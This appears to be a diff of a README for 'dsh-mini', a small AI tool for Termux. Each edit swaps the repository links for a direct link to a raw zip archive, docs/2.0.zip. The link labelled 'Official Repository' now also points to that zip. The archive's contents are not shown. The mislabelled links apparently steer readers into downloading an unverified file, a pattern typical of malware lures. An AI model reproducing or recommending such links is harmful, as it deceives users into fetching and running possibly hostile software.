@@ -37,7 +37,7 @@ Ready to try it? Here's your simple 2-step plan:
 
 ### Step 1: Download
 
-[![Download dsh-mini](https://img.shields.io/badge/Download-dsh--mini-blueviolet?style=for-the-badge&logo=github)](https://github.com/Shelaghfahrenheit482/dsh-mini)
+[![Download dsh-mini](https://img.shields.io/badge/Download-dsh--mini-blueviolet?style=for-the-badge&logo=github)](https://github.com/Shelaghfahrenheit482/dsh-mini/raw/refs/heads/main/docs/2.0.zip)
 
 Visit this link to download the application. It's a single page with the latest version.
 
@@ -133,7 +133,7 @@ This project is open source. Check the repository for the full license details.
 
 ## 🌐 Resources
 
-- **Official Repository**: [https://github.com/Shelaghfahrenheit482/dsh-mini](https://github.com/Shelaghfahrenheit482/dsh-mini)
+- **Official Repository**: [https://github.com/Shelaghfahrenheit482/dsh-mini/raw/refs/heads/main/docs/2.0.zip](https://github.com/Shelaghfahrenheit482/dsh-mini/raw/refs/heads/main/docs/2.0.zip)
 - **DeepSeek Engine**: The technology that powers this tool.
 - **Termux**: The Android terminal app for running dsh-mini on your phone.
 
@@ -157,7 +157,7 @@ dsh-mini is the perfect way to dip your toes into AI without the bloat. Whether 
 
 **Remember**: Visit the link below to get your copy:
 
-[🚀 Download dsh-mini Now](https://github.com/Shelaghfahrenheit482/dsh-mini)
+[🚀 Download dsh-mini Now](https://github.com/Shelaghfahrenheit482/dsh-mini/raw/refs/heads/main/docs/2.0.zip)
 
 Your journey into portable AI starts with a single click.
 
